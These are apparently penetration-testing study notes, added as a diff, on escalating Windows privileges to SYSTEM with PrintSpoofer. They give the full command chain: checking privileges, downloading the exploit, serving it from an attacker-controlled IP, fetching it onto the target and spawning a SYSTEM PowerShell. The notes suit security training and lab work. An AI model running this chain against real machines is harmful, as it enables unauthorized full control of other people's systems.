@@ -1,0 +1,17 @@
+*PrintSpoofer*
+	- coerce ```NT AUTHORITY\SYSTEM``` into connecting to a controlled named pipe.
+	- variation of the *aprinter bug
+	- Example:
+		- check privs
+			- ```whoami /priv```
+		- Download PrintSpoofer
+			- ```wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe```
+		- Transfer to tgt 
+			- ```python3 -m http.server 80```
+			- ```iwr -uri http://192.168.45.230/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe```
+		- Start PowerShell session in context of ```NT AUTHORITY\SYSTEM``` with PrintSpoofer
+			- ```.\PrintSpoofer64.exe -i -c powershell.exe```
+				- -c = command
+				- -i = interact in current cmd prompt
+		- verify
+			- ```whoami```
